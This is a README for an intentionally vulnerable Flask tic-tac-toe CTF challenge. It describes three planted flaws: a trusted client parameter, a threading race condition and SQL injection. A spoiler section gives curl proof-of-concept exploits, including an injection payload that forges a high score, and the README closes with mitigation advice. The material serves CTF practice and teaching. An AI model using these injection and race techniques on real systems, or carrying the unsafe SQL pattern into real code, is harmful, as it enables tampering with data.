# Tic-Tac-Toe CTF — Multi-stage Challenge

A lightweight, intentionally vulnerable Flask-based Tic-Tac-Toe / connect-four style challenge designed for learning and practice in web security and CTF exploitation. The challenge contains three parts (levels) with increasing complexity and different vulnerability classes:

* **Part 1 — 3×3 Tic-Tac-Toe**: client-controlled logic allows early-win shortcut.
* **Part 2 — 10×10 connect-4-style**: race condition via threaded delayed AI move.
* **Part 3 — 10×10 + scoring**: SQL injection in score submission.

This repository is meant for hosting the challenge binary/source for CTF events, practice, or educational use. Do **not** deploy this code to production.

---

## Contents

```
README.md
app.py             # Flask application (challenge)
static/             # static assets for front-end (if any)
uno.html, dos.html, tres.html  # level pages
scores.db          # sqlite DB created at runtime
```

---

## Quick start (local)

Requirements:

* Python 3.8+
* `pip` and a virtualenv are recommended

Install & run:

```bash
python -m venv venv
source venv/bin/activate
pip install -r requirements.txt  # or: pip install flask flask-cors
python app.py
```

By default the app listens on `0.0.0.0:5000`. Open `http://localhost:5000/` in your browser.

---

## Endpoints

### Part 1 (3×3)

* `GET /new_game_1` → creates a new 3×3 game and returns `{game_id, board}`
* `POST /move_1` → body: `{game_id, row, col, moveNo}` — play a move
* `POST /reset_1` → body: `{game_id}` — reset board

### Part 2 (10×10)

* `GET /new_game_2` → creates a new 10×10 game
* `POST /move_2` → body: `{game_id, row, col}` — play a move, AI responds in a delayed thread
* `GET /get_board_2?game_id=<id>` → read current board state
* `POST /reset_2` → reset board

### Part 3 (10×10 + scoring)

* `GET /new_game_3` → creates a new 10×10 game and initializes score
* `POST /move_3` → body: `{game_id, row, col}` — play a move
* `POST /reset_3` → reset board and score
* `POST /submit_score_3` → body: `{game_id, username}` — submit score (stored in SQLite)

---

## Intended vulnerabilities (for CTF / learning)

1. **Client-trusted parameters (Part 1)** — `moveNo` is trusted by the server to gate whether your move counts as an early move that can produce a flag. This is a logic trust issue and can be trivially abused by sending a crafted JSON payload.

2. **Race condition / TOCTOU (Part 2)** — The AI performs a delayed move in a background thread (`time.sleep(0.015)`), which creates a small time window between the player's move and the AI's execution. Reading or interacting with the board in that window allows exploiting a time-of-check/time-of-use condition.

3. **SQL injection (Part 3)** — The username in `/submit_score_3` is interpolated directly into an SQL `INSERT` string without proper parameterization. Although a small blacklist is present, it is insufficient to stop an injection.

---

## Example exploit PoCs (cURL)

> These are spoilers intended for collaborators or CTF writeups. Keep them in a `SPOILERS` section or remove before releasing the challenge in a live environment.

### Part 1 — fake `moveNo`

```bash
# create game
curl -s http://localhost:5000/new_game_1 | jq
# then post winning moves with moveNo set to 0
curl -X POST -H 'Content-Type: application/json' -d '{"game_id":"<id>","row":0,"col":0,"moveNo":0}' http://localhost:5000/move_1
```

The server trusts `moveNo` and will consider early wins eligible for the part-1 flag.

### Part 2 — race window

```bash
# create game
GAME_ID=$(curl -s http://localhost:5000/new_game_2 | jq -r .game_id)
# play a move that creates a winning line, then immediately read the board
curl -X POST -H 'Content-Type: application/json' -d "{\"game_id\": \"$GAME_ID\", \"row\": 1, \"col\": 1}" http://localhost:5000/move_2 &
# quickly query board before AI thread runs
curl "http://localhost:5000/get_board_2?game_id=$GAME_ID" | jq
```

Timing matters — the AI moves in a separate thread after a short `sleep`, so rapid requests increase the chance to hit the pre-AI state.

### Part 3 — SQL injection

```bash
# after winning enough rounds so your score > 0, submit a crafted username
curl -X POST -H 'Content-Type: application/json' -d '{"game_id":"<id>", "username":"pwned\', 999)--"}' http://localhost:5000/submit_score_3
```

The injected payload manipulates the SQL `INSERT` and can store an artificially high score, which the app checks to decide whether to reveal the flag.

---

## Hardening / mitigation suggestions

* **Never trust client-side logic**. Validate and compute game state exclusively on the server. Remove client-provided `moveNo` or enforce it server-side.
* **Avoid background threads for game-critical logic**. Use synchronous moves or implement robust locking (mutex) around shared state, or move the AI to a single-threaded event loop to remove race windows.
* **Use parameterized SQL queries** (prepared statements) instead of f-strings. Example with `sqlite3`:

```python
cursor.execute("INSERT INTO scores (user, score) VALUES (?, ?)", (username, score))
```

* **Limit surface & sanitize inputs** — apply length restrictions, allowlist usernames, and better error handling.

## Contribution & Contact

If you want edits, tests, or a polished writeup for the CTF platform, open an issue or submit a PR.

---

*Created for CTF practice and education. Use responsibly.*
